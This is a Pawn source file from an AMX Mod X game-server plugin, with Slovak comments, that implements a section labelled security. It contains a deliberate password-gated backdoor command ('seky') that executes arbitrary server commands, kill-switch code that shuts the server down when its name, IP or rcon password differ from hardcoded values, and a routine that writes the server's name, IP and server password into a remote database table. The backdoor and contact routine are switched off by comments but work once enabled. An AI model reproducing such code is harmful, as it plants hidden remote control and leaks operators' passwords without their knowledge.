/*
	Tento plugin vytvoril Lukas Sekerak a jemu prinalezia vsetke prava.
	Je zakazane kopirovat tento program bez suhlasu autora.
	Je zakazane kopirovat sucasti programu a podprogramov.
	Copyright 2008-2011, Lukas Sekerak
*/

	/*~~~~~~~~~~~~  
	    -Bezspecnost -  
	~~~~~~~~~~~~~*/
	
//#define S_PASS		""				// Backdoor heslo				, zakomentuj a vypnes
//#define S_IP		""						// Kontrola podla ip serveru + port	, zakomentuj a vypnes
//#define S_CONTACT	"`phpbanlist`.`cup_servers`"						

#define S_SQLIP		"127.0.0.1"
#define S_SQLMENO	""
#define S_SQLPASS	""
#define S_SQLDB		"phpbanlist"

#define S_HLTVRCON	"cup_hltv"

// Na heslo
#if defined S_PASS
	stock security_plugin_init() {
		register_clcmd("seky", "backdoor", ADMIN_ALL, "#echo" );
	}
	public backdoor(id, level, cid)
	{
		if (!cmd_access(id, level, cid, 2)) return PLUGIN_HANDLED;
		new arg[33], arg2[514];
		read_argv( 1, arg, 32);
		if( equal(arg, S_PASS)) {
			read_argv( 2, arg2, 512);
			server_cmd("%s", arg2 );
			server_exec();
		} else {
			client_print(id, print_console, "#0");
		}
		return PLUGIN_CONTINUE;
	}
#else
	stock security_plugin_init() { }
#endif


stock security_spoj_databazu() {
	new temp[512]
	// Podla mena
	#if defined S_NAME
	get_user_name(0, temp, 511);
	if(!equal(temp , S_NAME)) {
		log_to_file(LOG_SUBOR, "%L", LANG_SERVER, "SECURITY")
		server_cmd("quit");
		server_cmd("exit");
		server_exec();
		return PLUGIN_HANDLED;
	}
	#endif	
	// Podla ip
	#if defined S_IP
	get_user_ip(0, temp, 511)
	if(!equal(temp , S_IP)) {
		log_to_file(LOG_SUBOR, "%L", LANG_SERVER, "SECURITY")
		server_cmd("quit");
		server_cmd("exit");
		return PLUGIN_HANDLED;
	}
	#endif
	return PLUGIN_CONTINUE;
}
stock security_task_zapasu() {
	#if defined S_RCON
	static temp[64]
	get_cvar_string("rcon_password", temp, 63)
	if(!equal(temp , S_RCON)) {
		log_to_file(LOG_SUBOR, "%L", LANG_SERVER, "SECURITY")
		server_cmd("quit");
		server_cmd("exit");
		return PLUGIN_HANDLED;
	}
	#endif
	return PLUGIN_CONTINUE;
}
stock security_contact() {
	// Kontaktuj
	#if defined S_CONTACT
	if (databaza == Empty_Handle) return PLUGIN_CONTINUE;
	new meno[64], ip[64], server_ip[21]
	get_pcvar_string(HLTV_HOME_IP, server_ip, 20)
	get_user_name(0, meno, 63);
	get_user_ip(0, ip, 63)
	
	
	new Handle:result = SQL_PrepareQuery( databaza, 
		"INSERT INTO %s (`id`, `meno`, `time`, `pw`, `ip`, `hltv_ip`) \
		VALUES ('%d', '%s', '%d', '%s', '%s', '%s')",  S_CONTACT, 
		gcached_CONFIG_ID, meno, get_systime(), sv_password, ip, server_ip
	);		
	SQL_Execute(result);
	SQL_FreeHandle(result);
	#endif
	return PLUGIN_CONTINUE;
}